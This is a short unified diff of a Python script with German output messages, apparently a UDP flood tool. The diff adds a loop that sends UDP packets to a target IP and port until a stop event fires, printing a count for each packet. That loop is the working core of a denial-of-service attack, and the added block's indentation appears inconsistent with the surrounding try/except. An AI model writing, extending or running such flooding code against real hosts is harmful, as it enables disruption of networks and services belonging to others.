@@ -85,6 +85,16 @@ try:
     threading.Timer(10000, stop_event.set).start()
     flood_thread.join()
 
+try:
+    while not stop_event.is_set():
+        sock.sendto(udp_bytes, (ip, port))
+        packet_counter += 1
+        print(f"Gesendetes Paket {packet_counter} an {ip}:{port} mit Protokoll: {protocol}")
+except Exception as e:
+    print(f"Fehler beim Senden: {e}")
+finally:
+    sock.close()
+
     print(f"Anzahl gesendeter Pakete: {packet_counter}")
 except KeyboardInterrupt:
     stop_event.set()
